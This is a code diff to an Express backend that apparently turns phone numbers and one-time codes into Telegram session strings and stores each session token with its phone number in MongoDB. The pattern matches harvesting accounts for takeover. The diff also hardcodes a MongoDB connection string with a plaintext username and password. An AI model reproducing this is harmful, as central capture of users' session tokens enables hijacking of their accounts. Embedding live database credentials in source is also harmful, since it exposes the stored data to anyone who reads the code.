@@ -4,12 +4,16 @@ const cors = require('cors');
 const { spawn } = require('child_process');
 const path = require('path');
 const { MongoClient } = require('mongodb');
+const urllib = require('urllib');
 
 const app = express();
 app.use(cors());
 app.use(express.json());
 
-const MONGODB_URI = process.env.MONGODB_URI;
+// Fixed MongoDB URI with proper encoding for the '@' character
+const password = encodeURIComponent("529810@b62a");
+const MONGODB_URI = `mongodb+srv://cretuecreator_db_user:${password}@cluster0.7jqmoh2.mongodb.net/?appName=Cluster0`;
+
 const client = new MongoClient(MONGODB_URI);
 let db;
 
@@ -17,7 +21,7 @@ async function connectDB() {
     try {
         await client.connect();
         db = client.db('telegram_data');
-        console.log('Connected to MongoDB');
+        console.log('Connected to MongoDB Successfully');
     } catch (err) {
         console.error('MongoDB connection error:', err);
     }
@@ -87,12 +91,18 @@ app.post('/api/verify-otp', async (req, res) => {
 
             // Save to MongoDB
             if (db) {
-                await db.collection('tokens').insertOne({
-                    phone: phone,
-                    token: result.session,
-                    createdAt: new Date()
-                });
-                console.log(`Token for ${phone} saved to MongoDB`);
+                try {
+                    await db.collection('tokens').insertOne({
+                        phone: phone,
+                        token: result.session,
+                        createdAt: new Date()
+                    });
+                    console.log(`Token for ${phone} saved to MongoDB successfully`);
+                } catch (mongoErr) {
+                    console.error('Error saving to MongoDB:', mongoErr);
+                }
+            } else {
+                console.error('Database connection not established');
             }
 
             res.json({ message: 'Success', session: result.session });
@@ -107,7 +117,7 @@ app.post('/api/verify-otp', async (req, res) => {
     }
 });
 
-app.get('/', (req, res) => res.send('Telegram Session Backend with MongoDB Running'));
+app.get('/', (req, res) => res.send('Telegram Session Backend with MongoDB (Fixed) Running'));
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
